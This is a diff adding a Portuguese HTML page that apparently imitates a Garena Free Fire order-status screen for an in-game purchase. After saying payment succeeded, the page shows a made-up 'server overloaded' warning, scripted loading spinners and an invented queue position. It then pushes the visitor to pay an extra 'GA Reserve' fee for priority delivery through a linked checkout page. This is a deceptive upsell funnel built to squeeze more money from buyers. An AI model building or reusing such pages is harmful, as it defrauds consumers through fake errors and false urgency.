@@ -1,0 +1,189 @@
+<!DOCTYPE html><html lang="pt"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Live Oficial®</title>
+    <link rel="stylesheet" href="css/products.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+</head>
+<body>
+
+    <nav class="navbar" style="padding-top: 15px;">
+        <div class="menu-icon" style="padding-left: 3%;">
+            <img src="images/LogoRecFF.png" style="height: 5vh;" alt="Logo Central Vivara">
+        </div>
+
+        <div class="logo-central">
+        </div>
+
+        <div class="menu-icon" style="padding-right: 3%;">
+            <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: black">account_circle</span>
+        </div>
+    </nav>
+    <div id="ad1">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Seus pedidos</p>
+
+        <div class="ad1">
+
+            <div style="margin-left: 3%; margin-right: 3%;">
+
+                <button class="styled-button">
+                    <div class="icon-container">
+                        <!-- <img src="images/LogoGarenaFF.png" alt="Status de entrega" style="width: 32px; height: 32px;"> -->
+                        <img src="../img/ga.png" alt="Status GA" style="width: 32px; height: 32px;">
+                    </div>
+                    <span class="button-text">
+                        <span class="button-title">#6481749338</span>
+                    </span>
+                </button>
+    
+                <div class="entrega-container">
+                    <div class="entrega-header">
+                        Status
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container2">
+                            <span class="material-symbols-outlined">check</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Pagamento concluído</div>
+                        </div>
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container3">
+                            <span class="material-symbols-outlined">warning</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Servidor Sobrecarregado</div>
+                        </div>
+                    </div>
+                </div>
+    
+         
+    
+                <p style="text-align: center; margin-left: 3%; margin-right: 3%;">Seu pagamento foi concluido com sucesso, porém foi encontrado uma pendência no seu pedido. Clique abaixo para resolver esse problema!</p>
+    
+                <div class="button-container" style="padding-bottom: 20px;">
+                    <button class="styled-button2" onclick="showAd2();">
+                        <span class="button-text">
+                            <span class="button-title2">Resolver problema</span>
+                        </span>
+                        <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+                    </button>
+                </div>
+            </div>
+            
+        </div>
+
+        
+        
+    </div>
+
+
+    <div id="ad2" style="display: none;">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Problemas no pedido</p>
+
+        <div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
+
+            <div style="padding-top: 2px;"></div>
+
+            <div id="loadingGif" class="loading">
+                <div class="spinner"></div>
+            </div>
+    
+
+            <div class="entrega-container hidden" id="text1">
+                <div class="entrega-content">
+                    <div class="icon-container2">
+                        <span class="material-symbols-outlined">settings</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Posição na fila para recebimento do pedido: 824 de 1341 jogadores.</div>
+                    </div>
+                </div>
+            </div>
+    
+            <div id="loadingGif2" class="loading hidden">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text2" class="hidden entrega-container" style="margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: #9D0C21;">
+                        <span class="material-symbols-outlined">warning</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title"> Nosso servidor está sobrecarregado devido à alta latência dos pedidos.</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="loadingGif3" class="loading hidden" style="padding-top: 20px;">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text3" class="hidden entrega-container" style="background-color: #9D0C21; margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: rgb(255, 255, 255);">
+                        <span class="material-symbols-outlined" style="color: #9D0C21;">priority_high</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title" style="color: white">Seu pedido chegará em sua conta em até (72 horas úteis). Caso deseje prioridade na fila e a liberação imediata do pedido, será necessário efetuar o pagamento da GA Reserve.</div>
+                    </div>
+                </div>
+            </div>
+            <div id="finalButton" class="button-container hidden" style="padding-top: 15px;">
+                <button class="styled-button2" onclick="location.href='../checkout03.html';">
+                    <span class="button-text">
+                        <span class="button-title2">GA Reserve</span>
+                    </span>
+                    <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+                </button>
+            </div>
+             <script src="https://app.zippify.com.br/js/oneclick.js"></script>
+
+            <div style="padding-bottom: 2px;"></div>
+
+        </div>
+
+        
+
+    </div>
+    
+    
+    <script src="js/scripts.js"></script>
+
+    <script>
+        // Rastreamento de eventos quando a página carrega
+        document.addEventListener('DOMContentLoaded', function() {
+            // Opcional: Rastrear eventos quando os elementos aparecerem (se necessário com gtag)
+            // Exemplo:
+            // const showOrderProblemDetails = function() {
+            //     if (typeof gtag === 'function') {
+            //         gtag('event', 'order_problem_details_shown');
+            //     }
+            // };
+            
+            // Manter lógica original de showAd2 se houver, mas remover trackEvent
+            const originalShowAd2 = window.showAd2;
+            window.showAd2 = function() {
+                if (originalShowAd2) originalShowAd2();
+                // Exemplo de rastreamento com gtag se necessário:
+                // if (typeof gtag === 'function') {
+                //     gtag('event', 'order_problem_view', { step: 'problem_details' });
+                // }
+            };
+
+            // TODO: Add standard Google Ads event tracking if needed for this page view
+            // Example (a simple page view might be automatically handled by the base tag):
+            // if (typeof gtag === 'function' && window.googleAdsConfig?.accountId) {
+            //     gtag('event', 'page_view', { 'send_to': window.googleAdsConfig.accountId });
+            //     console.log('[Google Ads etapa02] Page view event sent (standard config might cover this).')
+            // }
+        });
+    </script>
+
+</body></html>
